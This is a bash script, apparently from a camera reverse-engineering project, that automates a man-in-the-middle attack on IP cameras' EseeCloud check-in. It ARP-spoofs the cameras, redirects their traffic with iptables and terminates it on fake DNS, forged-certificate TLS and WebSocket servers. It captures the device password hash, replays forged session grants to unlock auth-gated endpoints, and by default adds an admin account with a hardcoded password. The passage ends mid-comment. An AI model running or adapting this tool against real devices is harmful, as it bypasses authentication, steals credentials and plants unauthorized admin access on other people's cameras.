#!/usr/bin/env bash
# ── eseecloud-mitm-capture.sh — auth-free network MITM of EseeCloud check-in ──
#
# Variant of capture-eseecloud-dns.sh that needs NO camera API credentials:
# works on cameras whose HTTP auth is locked. Uses ARP spoofing + iptables
# REDIRECT (DNS + known EseeCloud check-in IPs + esee TCP ports) to force the
# camera's periodic cloud check-in to land on our fake EseeCloud servers.
# The check-in carries the password hash the esee cloud uses to authenticate
# the device — recoverable with eseecloud-parser.py.
#
# Usage (root required for ARP spoof + iptables + tcpdump):
#   sudo ./scripts/eseecloud-mitm-capture.sh [duration_seconds] [camera1 camera2 ...]
#   sudo ./scripts/eseecloud-mitm-capture.sh --no-early-abort [duration_seconds] [camera1 camera2 ...]
#
#   --no-early-abort   skip the fail-fast aborts (CERTREJECT and the 150s
#                      zero-connections guard) and capture the FULL requested
#                      window even if nothing connects — used by
#                      gate-flip-experiment.sh's hour-long measurement, where
#                      a camera's check-in timer may exceed the 150s guard.
#                      Env equivalent: NO_EARLY_ABORT=1.
#
# Output: captures/eseecloud-mitm-<ts>/  (connections log, data.bin, pcap)

set -u

# --no-early-abort / NO_EARLY_ABORT=1: disables the two mid-capture "nothing
# is connecting yet" aborts so a run waits out its full window even with zero
# camera traffic (see the guards at CERTREJECT / 150s-zero-connections below).
# The L2 pre-flight and server-startup checks are NOT affected — a camera that
# is unreachable at L2 or fake servers that failed to start still abort, since
# a full hour of silence there would be waste, not measurement.
NO_EARLY_ABORT="${NO_EARLY_ABORT:-0}"
_filtered=()
for _a in "$@"; do
  case "$_a" in
    --no-early-abort) NO_EARLY_ABORT=1 ;;
    *) _filtered+=("$_a") ;;
  esac
done
# ${arr[@]+...} guards the empty-array expansion under `set -u` (bash < 4.4
# would error on a bare "${_filtered[@]}" when every arg was the flag).
set -- ${_filtered[@]+"${_filtered[@]}"}

DURATION="${1:-360}"
# Every positional arg AFTER the duration is a camera IP. The old ${2:-...}
# only honored the FIRST one, so `... 360 10.0.0.29 10.0.0.169` silently
# dropped 10.0.0.169 and the run watched a single camera; an earlier
# `shift 2` consumed $1=360 AND $2, so a 2-camera invocation watched only
# the LAST camera. Consume exactly the duration so `360 cam1 cam2 ...` maps
# 1:1 to the camera list and a bare duration (or no args) falls back to the
# default fleet.
shift 1 2>/dev/null || true
if [ "$#" -gt 0 ]; then
  CAMS="$*"
else
  CAMS="10.0.0.29 10.0.0.169"
fi
OUR_IP="10.0.0.149"
DNS_PORT="5399"   # not 5353 — avahi/mDNS owns UDP 5353 and the bind fails
ESEE_PORTS="8800 10000 35000 37777 37778 34567 15001 15002 18004 34569 10080 20000 25000 19000 443 8443 9900 8080 80"
# 19000 = observed Wansview check-in channel (pm.dvr163.com). The camera
# sends an HTTP Upgrade: websocket handshake there and the password-bearing
# payload arrives as WebSocket frames — so it is handled by
# eseecloud-ws-server.py, NOT the plain or TLS servers.
# Ports the camera speaks TLS on (observed live: :8080/:443 to Wansview cloud).
# These are handled by eseecloud-tls-server.py (forged-cert termination); the
# rest stay with the plain eseecloud-dns-server.py fake listeners.
TLS_PORTS="8080 8443 443 9900"
WS_PORTS="19000"
# WS_REPLY_MODE lets an operator override the ws-server reply engine without
# editing the script. Default "replay" grants the session (check-in success);
# "custom" with WS_REPLY_HEX= (empty) reproduces the 10:43Z FAILING state
# that makes the camera fall back to its HTTP /message/nonce retry loop — the
# state the controlled verify-formula validation run needs to capture a
# second real (nonce, verify) sample.
WS_REPLY_MODE="${WS_REPLY_MODE:-replay}"
WS_REPLY_HEX="${WS_REPLY_HEX:-}"
# How the replay computes the grant's next-counter: cadence (mirror the real
# server's ~0x13A0 per-check-in jump — the camera adopts these) or plus1
# (legacy counter+1, never adopted under MITM; kept for A/B).
WS_NEXT_COUNTER="${WS_NEXT_COUNTER:-cadence}"
# LITE monitor run-mode (default ON): the ws-server logs each camera's
# observed LITE 0x00 counter delta (LITE_DELTA — natural +0x14 vs our granted
# lite-cadence) and flags the moment a FULL 0x11 registration arrives after
# we granted that camera (FULL_ESCALATION — the adoption precondition that
# previously required a power-cycle to observe). On first escalation the
# capture loop extends the window +120s so the full registration + grant land
# within THIS run. Set WS_LITE_MONITOR=0 to disable.
WS_LITE_MONITOR="${WS_LITE_MONITOR:-1}"
# After a run that captured an ADOPTED full 0x11 registration, the script
# verifies each camera's /user/*.xml gate (check-in status + user list) and
# adds the admin account when the gate flipped. Env overrides:
#   AUTO_ADMIN=0         capture only — do NOT add the admin account
#   ADMIN_USER=...       account name (default operator, admin level)
#   ADMIN_PASS=...       account password (default BossCam2026!)
#   GATE_RETRY_SLEEP=...  seconds between gate probes (default 5; up to 3 probes)
#   GOAL_GRACE=...       seconds to keep capturing after data + an ADOPTED
#                        verdict before completing early (default 60; 0 = stop
#                        immediately once the camera adopts our grant)
#   P2P_FORGE_IP=...     public P2P IP the forged /address/device reply points
#                        the camera at (default 129.153.101.14, an observed real
#                        P2P IP). It is ALWAYS added to the redirect set below,
#                        so the camera's RAW-WS FULL 0x11 registration to it
#                        lands on our :19000 ws-server regardless of the value.
#                        Returning OUR OWN IP makes the camera downgrade to the
#                        HTTP-upgrade LITE form, which is never adopted.
#   STUN_FORGE_IP=...    public STUN IP returned in the forged reply's
#                        stun.ipv4 (default 14.17.121.21, the REAL server's
#                        constant value observed in captures 20260808T053714Z
#                        and 050802Z). MUST differ from P2P_FORGE_IP: the
#                        camera reads stun == relay as "not the real
#                        distributed cloud" and downgrades to the never-
#                        adopted HTTP-upgrade LITE check-in.
AUTO_ADMIN="${AUTO_ADMIN:-1}"
ADMIN_USER="${ADMIN_USER:-operator}"
ADMIN_PASS="${ADMIN_PASS:-BossCam2026!}"
GATE_RETRY_SLEEP="${GATE_RETRY_SLEEP:-5}"
GOAL_GRACE="${GOAL_GRACE:-60}"
P2P_FORGE_IP="${P2P_FORGE_IP:-129.153.101.14}"
STUN_FORGE_IP="${STUN_FORGE_IP:-14.17.121.21}"
# MUST-differ guard: stun == relay makes the camera treat us as a fake cloud
# and drop to the never-adopted HTTP-upgrade LITE path (see --stun-ip help).
if [ "$STUN_FORGE_IP" = "$P2P_FORGE_IP" ]; then
  echo "!! STUN_FORGE_IP must differ from P2P_FORGE_IP (got $STUN_FORGE_IP) — camera would downgrade to LITE." >&2
  echo "   Set STUN_FORGE_IP to the real shared STUN server (default 14.17.121.21)." >&2
  exit 1
fi
PLAIN_PORTS=""
for p in $ESEE_PORTS; do
  case " $TLS_PORTS $WS_PORTS " in
    *" $p "*) ;;
    *) PLAIN_PORTS="$PLAIN_PORTS $p" ;;
  esac
done
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
SESSION="$PROJECT_ROOT/captures/eseecloud-mitm-$(date -u +%Y%m%dT%H%M%SZ)"
mkdir -p "$SESSION"

if [[ $EUID -ne 0 ]]; then
  echo "Must run as root (ARP spoof + iptables + tcpdump)." >&2
  exit 1
fi

GATEWAY=$(ip route show default | awk '{print $3}')
IFACE=$(ip route get "$(echo $CAMS | awk '{print $1}')" 2>/dev/null | grep -oP 'dev \K\S+' | head -1)
IFACE="${IFACE:-eth0}"

echo "═══ EseeCloud MITM capture ═══"
echo "  session:  $SESSION"
echo "  cameras:  $CAMS"
echo "  our IP:   $OUR_IP   iface: $IFACE   gateway: $GATEWAY"
echo ""

CLOUD_IPS=()
# Observed real P2P/check-in server IPs: the camera dials these DIRECTLY from
# its cached /address/device result (pm.dvr163.com's P2P tier) — see captures
# 20260808T050802Z/053046Z. It keeps an ESTABLISHED session to them, so the
# port-19000 REDIRECT alone never sees the full 0x11 registration; we redirect
# them AND flush those sessions below so the camera re-establishes through us.
OBSERVED_P2P_IPS="129.153.101.14 172.235.43.92 47.79.67.71"
for d in checkin.eseecloud.com p2p.eseecloud.com register.eseecloud.com api.eseecloud.com dns.eseecloud.com; do
  for ip in $(getent ahostsv4 "$d" 2>/dev/null | awk '{print $1}' | sort -u) $OBSERVED_P2P_IPS $P2P_FORGE_IP; do
    case " ${CLOUD_IPS[*]:-} " in
      *" $ip "*) ;;
      *) CLOUD_IPS+=("$ip") ;;
    esac
  done
done
echo "  real esee cloud IPs to redirect: ${CLOUD_IPS[*]:-none (DNS-intercept only)}"

# PIDs of background jobs (empty until started)
DUMP_PID=""
SYN_PID=""
BC_PID=""
SERVER_PID=""
TLSSERVER_PID=""
WSSERVER_PID=""
# P2P/check-in IPs discovered mid-run by the SYN-watch auto-heal (see
# auto_heal_escaped below). Each entry got a dest-based iptables REDIRECT
# rule + conntrack flush; remove_rules tears these down too so re-runs and
# aborts always leave a clean iptables state.
AUTO_IPS=()

# Remove every rule this script adds (also used pre-flight to clear stale
# rules from an interrupted run, so add/remove always stay in lockstep).
# Note: this deletes any pre-existing rule with the same spec — the script
# assumes ownership of these rule specs for the target camera IPs.
remove_rules() {
  for ip in $CAMS; do
    iptables -t nat -D PREROUTING -s "$ip" -p udp --dport 53 -j REDIRECT --to-port "$DNS_PORT" 2>/dev/null
    iptables -t nat -D PREROUTING -s "$ip" -p tcp --dport 53 -j REDIRECT --to-port "$DNS_PORT" 2>/dev/null
    for p in $ESEE_PORTS; do
      iptables -t nat -D PREROUTING -s "$ip" -p tcp --dport "$p" -j REDIRECT 2>/dev/null
    done
    for cip in "${CLOUD_IPS[@]}"; do
      iptables -t nat -D PREROUTING -s "$ip" -d "$cip" -p tcp -j REDIRECT 2>/dev/null
    done
    # Auto-healed IPs from THIS run (empty-array-safe under set -u).
    for cip in "${AUTO_IPS[@]+"${AUTO_IPS[@]}"}"; do
      iptables -t nat -D PREROUTING -s "$ip" -d "$cip" -p tcp -j REDIRECT 2>/dev/null
    done
    # Sweep: delete ANY remaining dest-based REDIRECT rule for this camera
    # (the only place this script adds `-d <ip>` rules is the cloud-IP and
    # auto-heal loops). This catches auto-heal IPs leaked by a hard-killed
    # previous run (kill -9 skips the EXIT trap) whose discovered IPs the
    # next run's AUTO_IPS — which resets per process — cannot know.
    # NOTE: iptables -S prints addresses normalized to CIDR (`-s 10.0.0.29/32`),
    # so the source pattern must tolerate an optional /mask — a plain space
    # after the IP would match nothing against real output.
    iptables -t nat -S PREROUTING 2>/dev/null |
      grep -E -- "-s ${ip}(/[0-9]+)? .*-d .* -p tcp -j REDIRECT" |
      sed 's/^-A PREROUTING //' |
      while read -r spec; do
        if ! iptables -t nat -D PREROUTING $spec 2>/dev/null; then
          echo "  !! failed to sweep leftover rule: $spec" >&2
        fi
      done
    iptables -D FORWARD -s "$ip" -j ACCEPT 2>/dev/null
  done
}

cleanup() {
  echo ""
  echo "═══ tearing down ═══"
  [[ -n "$SERVER_PID" ]] && kill "$SERVER_PID" 2>/dev/null
  [[ -n "$TLSSERVER_PID" ]] && kill "$TLSSERVER_PID" 2>/dev/null
  [[ -n "$WSSERVER_PID" ]] && kill "$WSSERVER_PID" 2>/dev/null
  [[ -n "$BC_PID" ]] && kill "$BC_PID" 2>/dev/null
  [[ -n "$DUMP_PID" ]] && kill "$DUMP_PID" 2>/dev/null
  [[ -n "$SYN_PID" ]] && kill "$SYN_PID" 2>/dev/null
  sleep 1
  remove_rules
  echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
  echo "  session files:"
  ls -la "$SESSION" 2>/dev/null
}
trap cleanup EXIT INT TERM

echo "  enabling IP forwarding"
echo 1 > /proc/sys/net/ipv4/ip_forward

# ── pre-flight: clear any stale matching rules from a previous interrupted
#    run so re-runs converge to a clean state (add/remove stay symmetric) ──
remove_rules

# ── iptables redirects: camera DNS + esee ports + real cloud IPs → local ──
for ip in $CAMS; do
  iptables -t nat -A PREROUTING -s "$ip" -p udp --dport 53 -j REDIRECT --to-port "$DNS_PORT"
  iptables -t nat -A PREROUTING -s "$ip" -p tcp --dport 53 -j REDIRECT --to-port "$DNS_PORT"
  for p in $ESEE_PORTS; do
    iptables -t nat -A PREROUTING -s "$ip" -p tcp --dport "$p" -j REDIRECT
  done
  if [ "${#CLOUD_IPS[@]}" -gt 0 ]; then
    for cip in "${CLOUD_IPS[@]}"; do
      iptables -t nat -A PREROUTING -s "$ip" -d "$cip" -p tcp -j REDIRECT
    done
  fi
  # keep the cameras' non-redirected LAN traffic flowing while ARP-spoofed
  iptables -I FORWARD -s "$ip" -j ACCEPT
done

# ── DNS interceptor + fake EseeCloud servers (plain protocol ports) ──
# --p2p-ip: the forged /address/device reply points the camera at a REAL
# public P2P IP (P2P_FORGE_IP) so it uses its RAW-WS FULL 0x11 check-in
# behavior instead of the HTTP-upgrade LITE form; the dest-based REDIRECT
# for that IP then lands the connection on our local :19000 ws-server.
# --stun-ip: the reply's stun.ipv4 must be a DIFFERENT public IP than the
# P2P relay (real value 14.17.121.21 observed in both real-cloud captures).
# When stun == relay the camera treats us as a fake/proxied cloud and drops
# to the never-adopted HTTP-upgrade LITE path.
python3 "$SCRIPT_DIR/eseecloud-dns-server.py" \
  --our-ip "$OUR_IP" --dns-port "$DNS_PORT" --upstream 8.8.8.8 \
  --ports $PLAIN_PORTS --p2p-ip "$P2P_FORGE_IP" --stun-ip "$STUN_FORGE_IP" \
  --log-dir "$SESSION" \
  > "$SESSION/server.log" 2>&1 &
SERVER_PID=$!
sleep 2
if ! kill -0 "$SERVER_PID" 2>/dev/null; then
  echo "!! DNS/fake server failed to start — see $SESSION/server.log" >&2
  exit 1
fi
echo "  fake esee servers + DNS interceptor up (PID $SERVER_PID)"

# ── TLS-terminating fake server (forged cert) on the TLS ports ──
python3 "$SCRIPT_DIR/eseecloud-tls-server.py" \
  --ports $TLS_PORTS --log-dir "$SESSION" \
  > "$SESSION/tls-server.log" 2>&1 &
TLSSERVER_PID=$!
sleep 2
if ! kill -0 "$TLSSERVER_PID" 2>/dev/null; then
  echo "!! TLS fake server failed to start — see $SESSION/tls-server.log" >&2
  exit 1
fi
echo "  TLS fake server up on ports [$TLS_PORTS] (PID $TLSSERVER_PID)"

# ── WebSocket-terminating fake server on the camera check-in port ──
# --reply-mode replay: answers the camera's :19000 frames with the decoded
# real-cloud check-in protocol (cefaeffe hello -> ack, abbccdde 11
# registration -> abbccdde 12 session grant), so the camera's "check in"
# state flips to success and the /user/*.xml endpoints unlock. Decoded from
# captures of the camera talking to the real server (172.235.43.92:19000).
# keepalive is intentionally NOT used here — replay mode answers every frame
# itself and injected empty frames would corrupt the handshake.
WS_ARGS=(--ports $WS_PORTS --log-dir "$SESSION" --reply-mode "$WS_REPLY_MODE" \
  --next-counter "$WS_NEXT_COUNTER" --lite-cadence "${WS_LITE_CADENCE:-0x1E}")
if [ "$WS_LITE_MONITOR" = "1" ]; then
  WS_ARGS+=(--lite-monitor)
fi
if [ -n "$WS_REPLY_HEX" ]; then
  WS_ARGS+=(--reply-hex "$WS_REPLY_HEX")
fi
python3 "$SCRIPT_DIR/eseecloud-ws-server.py" "${WS_ARGS[@]}" \
  > "$SESSION/ws-server.log" 2>&1 &
WSSERVER_PID=$!
sleep 2
if ! kill -0 "$WSSERVER_PID" 2>/dev/null; then
  echo "!! WS fake server failed to start — see $SESSION/ws-server.log" >&2
  exit 1
fi
echo "  WS fake server up on ports [$WS_PORTS] (PID $WSSERVER_PID)"

# ── ARP spoof cameras through us ──
# bettercap needs a COMMA-separated target list — space-separated fails with
# "could not parse target: syntax error" and silently kills the whole MITM.
CAMS_COMMA=$(echo $CAMS | tr ' ' ',')
cat > "$SESSION/arp.cap" <<EOCAP
set arp.spoof.targets $CAMS_COMMA
set arp.spoof.internal true
set arp.spoof.full-duplex true
arp.spoof on
events.ignore endpoint.new
events.ignore endpoint.lost
EOCAP
bettercap -iface "$IFACE" -no-colors -silent -caplet "$SESSION/arp.cap" > "$SESSION/bettercap.log" 2>&1 &
BC_PID=$!
sleep 3
if ! kill -0 "$BC_PID" 2>/dev/null; then
  echo "!! bettercap failed to start — see $SESSION/bettercap.log" >&2
  exit 1
elif grep -qiE 'error|fail|refused|permission denied' "$SESSION/bettercap.log" 2>/dev/null; then
  echo "!! bettercap reported errors — see $SESSION/bettercap.log" >&2
  exit 1
fi

# Verify the cameras are reachable at L2 (ARP entry present, any MAC). We do
# NOT require the entry to be OUR MAC: in a working full-duplex spoof our own
# table still shows the camera's real MAC (our service polls it directly), so
# MAC equality would false-abort a healthy capture. Spoof health is covered by
# the bettercap log-grep above and the live connections/data counters below.
# Retry up to 90s for mid-boot cameras; require AT LEAST ONE camera present —
# a single slow-booting camera must not abort the whole capture (the others'
# check-ins are worth capturing, and the window covers late arrivals).
deadline=$((SECONDS + 90))
present=0
while [ "$present" -eq 0 ] && [ "$SECONDS" -lt "$deadline" ]; do
  present=0
  for ip in $CAMS; do
    entry=$(ip neigh show "$ip" 2>/dev/null | grep -oE 'lladdr [0-9a-f:]{17}' | awk '{print $2}' | head -1)
    if [[ -n "$entry" ]]; then
      echo "  camera $ip reachable at L2 (MAC $entry)"
      present=$((present + 1))
    else
      echo "  $ip not in ARP table yet (booting?) — retrying..."
    fi
  done
  if [ "$present" -eq 0 ]; then
    sleep 5
  fi
done
if [ "$present" -eq 0 ]; then
  echo "!! no cameras reachable at L2 after 90s — aborting before wasting the window." >&2
  exit 1
fi
echo "  ARP spoof active on $IFACE (PID $BC_PID) — $present camera(s) online"

# ── flush the cameras' ESTABLISHED cloud check-in sessions ──
# iptables REDIRECT only applies to NEW connections. The camera's FULL 0x11
# registration (serial + password hash) rides a long-lived TCP session to the
# real P2P IP — established before this MITM started — so it never lands on
# our WS server and the gate can't flip. Killing those sessions forces the
# camera to re-establish through the redirect: the next full registration
# arrives at eseecloud-ws-server.py, which answers with the byte-accurate
# 100-byte session grant. (conntrack is optional; without it the camera's own
# periodic re-dial may still land new sessions on us if rules pre-date them.)
for ip in $CAMS; do
  for p in $WS_PORTS; do
    conntrack -D -s "$ip" -p tcp --dport "$p" 2>/dev/null
  done
  for cip in "${CLOUD_IPS[@]}"; do
    conntrack -D -s "$ip" -p tcp -d "$cip" 2>/dev/null
  done
done
if ! command -v conntrack >/dev/null 2>&1; then
  echo "  !! conntrack not found — established cloud sessions NOT flushed; install conntrack-tools" >&2
  echo "     or power-cycle the cameras so their full 0x11 registration re-dials through us." >&2
else
  echo "  flushed established cloud sessions (conntrack) so the full 0x11 registration re-dials through us"
fi

# ── tcpdump ──
TCPFILTER=""
for ip in $CAMS; do TCPFILTER="$TCPFILTER host $ip or"; done
TCPFILTER="${TCPFILTER% or}"
tcpdump -i any -w "$SESSION/capture.pcap" -s 0 "$TCPFILTER" > "$SESSION/tcpdump.log" 2>&1 &
DUMP_PID=$!
sleep 1

# ── SYN-watch: live map of every NEW TCP connection the cameras attempt ──
# A cheap diagnostic that surfaces ESCAPING cloud registrations. The camera's
# full 0x11 check-in rides a connection to a P2P IP; if that IP is outside
# OBSERVED_P2P_IPS/CLOUD_IPS the traffic is NOT redirected and the gate can
# never flip. SYN packets carry the PRE-DNAT destination, so a SYN to a cloud
# IP appears here whether or not it was redirected — the status loop flags
# dests that are neither ours nor in the redirect list, naming the missing IP
# without pcap forensics.
SYNLOG="$SESSION/syn-watch.log"
SYN_FILTER=""
for ip in $CAMS; do SYN_FILTER="$SYN_FILTER host $ip or"; done
SYN_FILTER="${SYN_FILTER% or}"
# Pure SYNs only (tcp-ack == 0): SYN-ACK replies from OUR OWN fake servers
# (src=OUR_IP -> dst=camera) also set the SYN bit and would be misparsed as
# camera dests — pure SYNs are only ever originated by the camera.
tcpdump -i any -nn -l "tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack == 0 and ($SYN_FILTER)" \
  > "$SYNLOG" 2>/dev/null &
SYN_PID=$!
sleep 1

# ── auto-heal: redirect newly-discovered P2P/cloud IPs mid-run ──
# The SYN-watch surfaces camera SYNs to destinations that are NOT redirected
# (neither ours nor in CLOUD_IPS). Instead of just reporting them — which used
# to mean abort, edit OBSERVED_P2P_IPS, and rerun — this adds a dest-based
# REDIRECT rule + conntrack flush for each new public IP right now, so the
# full 0x11 registration starts landing on our WS server within the SAME run.
# LAN/private dests (gateway, other cameras) are deliberately skipped: the
# cameras' own peers must keep flowing normally, not be redirected into our
# fake servers.
auto_heal_escaped() {
  local synlog="$1"
  local esc_dests d dip dport cip cam seen changed=0
  # Camera SYNs whose dest is neither OUR_IP nor already redirected
  # (CLOUD_IPS ∪ AUTO_IPS) — ip:port lines derived from the SYN-watch log.
  esc_dests=$(awk '{ if ($4 == "IP" && match($0, / > [0-9.]+:/)) {
      s = substr($0, RSTART + 3, RLENGTH - 4)
      n = split(s, f, ".")
      ip = ""; for (i = 1; i < n; i++) ip = ip (i > 1 ? "." : "") f[i]
      if (ip != "'$OUR_IP'") print ip ":" f[n]
  }}' "$synlog" 2>/dev/null | sort -u)
  for cip in "${CLOUD_IPS[@]}" "${AUTO_IPS[@]+"${AUTO_IPS[@]}"}"; do
    esc_dests=$(printf '%s\n' "$esc_dests" | grep -v "^$cip:" || true)
  done
  [ -z "$esc_dests" ] && return 0
  # Aggregate log once per new dest set, so LAN/private dests (which we
  # deliberately never redirect) don't spam the console every 5s tick.
  seen=$(cat "$SESSION/.esc-seen" 2>/dev/null || true)
  if [ "$seen" != "$esc_dests" ]; then
    changed=1
    # Destinations are about to be healed — or deliberately skipped as
    # LAN/private — in the loop below, so say so rather than "still escaping".
    echo "  !! camera SYN to NEW non-redirected dests (healing or skipping): $(echo "$esc_dests" | tr '\n' ' ')"
    echo "$esc_dests" > "$SESSION/.esc-seen"
  fi
  for d in $esc_dests; do
    dip="${d%%:*}"
    dport="${d##*:}"
    [ -z "$dip" ] && continue
    # Never redirect LAN/private traffic: the cameras' peers (gateway, other
    # cameras) live in RFC1918/link-local space and must stay reachable.
    case "$dip" in
      10.*|192.168.*|172.1[6-9].*|172.2[0-9].*|172.3[0-1].*|127.*|169.254.*)
        [ "$changed" -eq 1 ] && echo "  ↻ auto-heal: skip $dip:$dport (LAN/private — not redirecting)"
        continue ;;
    esac
    # Skip IPs already healed in a previous tick (or an earlier port of the
    # SAME IP this tick) — iptables -D only removes the FIRST matching rule,
    # so a duplicate -A would leak one rule after cleanup.
    case " ${AUTO_IPS[*]:-} " in
      *" $dip "*) continue ;;
    esac
    AUTO_IPS+=("$dip")
    for cam in $CAMS; do
      iptables -t nat -A PREROUTING -s "$cam" -d "$dip" -p tcp -j REDIRECT
      conntrack -D -s "$cam" -p tcp -d "$dip" 2>/dev/null
    done
    echo "  ↻ auto-heal: NEW P2P IP $dip:$dport redirected through us "
    echo "     (iptables -d REDIRECT + conntrack flush applied for ${CAMS// /, })"
  done
}

# ── goal-based early completion ──
# The capture loop is a fixed-duration hunt (default 360s) so slow cameras are
# still caught. But once the run actually achieves its goal — check-in data
# captured AND the camera adopted our granted next-counter (the ws-server's
# ADOPTED verdict, the real acceptance signal) — idling out the remaining
# window wastes minutes. check_goal_complete sets a bounded grace deadline;
# the loop breaks when elapsed reaches it, so a successful run self-completes
# instead of running the full requested window. Runs that never see an ADOPTED
# verdict keep the full window — no false completion, no lost hunt time.
GOAL_DEADLINE=0
check_goal_complete() {
  local elapsed="$1" data="$2" adopted
  [ "$GOAL_DEADLINE" -gt 0 ] && return 0  # already scheduled
  [ "$data" -le 0 ] && return 0            # nothing captured yet
  adopted=$(grep -c "ADOPTED ★★★" "$SESSION/eseecloud-connections.log" 2>/dev/null || true)
  adopted=${adopted:-0}
  if [ "$adopted" -gt 0 ]; then
    GOAL_DEADLINE=$((elapsed + GOAL_GRACE))
    echo "  *** goal achieved: data + ADOPTED verdict — finishing in ${GOAL_GRACE}s ***"
  fi
}

# True when the camera's /user/*.xml gate reads OPEN (i.e. no "check in
# falied") — the actual operational prize. Used by the loop to exit the moment
# the gate flips instead of waiting out GOAL_GRACE, and by verify_and_unlock
# to decide the admin add. curl is stubbed in harnesses, so this stays a
# standalone probe. (Mirrors verify_and_unlock's gate check with simpler,
# single-shot semantics — do not dedupe without porting its 3-probe retry.)
gate_probe_open() {
  local ip="$1" gate
  gate=$(curl -s -m 3 "http://$ip/user/user_list.xml" | tr -d '\r')
  [ -n "$gate" ] && ! echo "$gate" | grep -q "check in falied"
}

echo ""
echo "═══ capturing for up to ${DURATION}s — watching for check-in ═══"
elapsed=0
got_data=0
ESC_SEEN=0
while [ "$elapsed" -lt "$DURATION" ]; do
  sleep 5
  elapsed=$((elapsed + 5))
  conns=$(grep -c CONNECT "$SESSION/eseecloud-connections.log" 2>/dev/null || true)
  conns=${conns:-0}
  data=$(grep -c DATA "$SESSION/eseecloud-connections.log" 2>/dev/null || true)
  data=${data:-0}
  dns=$(grep -c REDIRECT "$SESSION/dns-queries.log" 2>/dev/null || true)
  dns=${dns:-0}
  echo "  [${elapsed}s] connections=$conns data_chunks=$data dns_redirects=$dns"
  # Re-flush camera->cloud conntrack tuples for the first minute (scoped to
  # the cloud dests only, so our own fake-server sessions are never touched):
  # cheap insurance against a cloud session re-establishing without a NAT
  # mapping and silently carrying the full 0x11 registration past us.
  if [ "$elapsed" -le 60 ] && command -v conntrack >/dev/null 2>&1; then
    for ip in $CAMS; do
      for cip in "${CLOUD_IPS[@]}"; do
        conntrack -D -s "$ip" -p tcp -d "$cip" 2>/dev/null
      done
    done
  fi
  # Auto-heal escaping registrations: any camera SYN to a destination that is
  # neither ours nor already redirected gets a dest-based REDIRECT rule +
  # conntrack flush THIS iteration, so the full 0x11 lands on us without a
  # rerun. LAN/private dests are skipped inside auto_heal_escaped; its
  # .esc-seen guard keeps the per-set log from repeating every 5s.
  auto_heal_escaped "$SYNLOG"
  # LITE monitor: flag the moment a camera escalates to FULL 0x11 after any
  # grant (the adoption precondition that used to need a power-cycle). When it
  # happens, extend the window +120s so the full registration + grant get
  # captured within THIS run instead of requiring a rerun.
  if [ "$WS_LITE_MONITOR" = "1" ] && [ "$ESC_SEEN" -eq 0 ] \
     && grep -q "FULL_ESCALATION" "$SESSION/eseecloud-connections.log" 2>/dev/null; then
    ESC_SEEN=1
    echo "  ★★★ FULL 0x11 ESCALATION detected — camera attempting full registration after our grant (adoption precondition) ★★★"
    echo "  *** extending window +120s to capture the full registration + grant ***"
    if [ "$((elapsed + 120))" -gt "$DURATION" ]; then
      DURATION=$((elapsed + 120))
    fi
  fi
  if [ "$data" -gt 0 ] && [ "$got_data" -eq 0 ]; then
    echo "  *** check-in data captured — extending 120s for full handshake ***"
    got_data=1
    # Extend past the original deadline; NEVER truncate the requested window
    # (a plain assignment here would cut a 420s run to ~125s the moment any
    # data arrived, missing the ~60-100s message-push cycle).
    if [ "$((elapsed + 120))" -gt "$DURATION" ]; then
      DURATION=$((elapsed + 120))
    fi
  fi
  # Goal-based early completion: once data + an ADOPTED verdict are both seen,
  # the mission is accomplished — stop GOAL_GRACE seconds later instead of
  # idling out the requested window. The grace covers the camera's internal
  # gate flip before the post-loop gate verification runs.
  check_goal_complete "$elapsed" "$data"
  if [ "$GOAL_DEADLINE" -gt 0 ]; then
    # Gate-OPEN early exit (P9/P15): if the /user/*.xml gate already reads
    # open, the mission is DONE — break now instead of waiting out the grace.
    # Only probe after the goal is achieved so we never hammer the gate on
    # failed runs.
    for cam in $CAMS; do
      if gate_probe_open "$cam"; then
        echo "  *** gate OPEN on $cam — stopping capture early (goal complete) ***"
        GOAL_DEADLINE=$elapsed
        break
      fi
    done
    if [ "$elapsed" -ge "$GOAL_DEADLINE" ]; then
      echo "  *** mission complete — stopping capture early (data + ADOPTED verdict) ***"
      break
    fi
  fi
  # Fail fast on cert rejection ONLY if nothing has been captured yet. The
  # primary channel is now the WS check-in on 19000 — a cert rejection on
  # :8080/:443 must NOT abort a run that is capturing WS data.
  if [ "$NO_EARLY_ABORT" != "1" ] && [ "$data" -eq 0 ] \
     && grep -q CERTREJECT "$SESSION/eseecloud-connections.log" 2>/dev/null; then
    echo "!! Camera rejected the forged TLS cert and nothing captured yet (CERTREJECT) — aborting." >&2
    exit 1
  fi
  # Fail fast if spoofing is silently blocked (e.g. WiFi AP client isolation):
  # a healthy capture shows connections or DNS redirects within ~150s of the
  # cameras being up, so zero-everything means the MITM path is dead. With
  # --no-early-abort this guard is skipped so the run covers the full window
  # even when the camera's check-in timer is longer than 150s (gate-flip
  # experiment's hour-long measurement depends on this).
  if [ "$NO_EARLY_ABORT" != "1" ] \
     && [ "$elapsed" -ge 150 ] && [ "$conns" -eq 0 ] && [ "$data" -eq 0 ] && [ "$dns" -eq 0 ]; then
    echo "!! Zero connections/DNS after 150s — ARP spoof likely blocked (AP client isolation?). Aborting." >&2
    exit 1
  fi
done

echo "═══ capture window complete ═══"

# ── post-capture: verify the /user/*.xml gate flipped, then add admin ──
# The whole point of the run: the forged check-in should have set the camera's
# $.Auth.ticket, unlocking /user/*.xml (firmware cgi_user.c). Two independent
# signals confirm the flip:
#   1. Protocol check-in status — the ws-server's ADOPTED verdict: the camera's
#      next registration counter equals the next-counter we granted (logged as
#      "★★★ ADOPTED ★★★" in eseecloud-connections.log with the camera's src
#      IP). This is the real acceptance signal, not just "we sent a grant".
#   2. Camera-side check-in status — GET /user/user_list.xml returns "check in
#      falied" while gated and the real user list once open (same probe
#      eseecloud-gate-probe.sh uses). This firmware family has no separate
#      check-in HTTP endpoint; the gate state IS the check-in status.
# Only when the gate reads open do we hand off to eseecloud-add-admin.sh to
# create/reset the admin account. AUTO_ADMIN=0 skips the handoff (pure capture).

# ── post-capture: /message/ HTTP check-in chain summary (session-wide) ──
# Both the plain :80 and TLS :9900 forge engines write to the shared
# eseecloud-connections.log with the NONCE_FORGED / STS_FORGED / MESSAGE_POST
# markers, so a NONCE_FORGED paired with a later MESSAGE_POST proves the camera
# completed a verify-computation cycle against OUR nonce (the camera hashes the
# nonce we issued, returns verify=, and we log it) — the /message/ path is the
# gate's alternate route when the WS 0x11 registration stays LITE-only. These
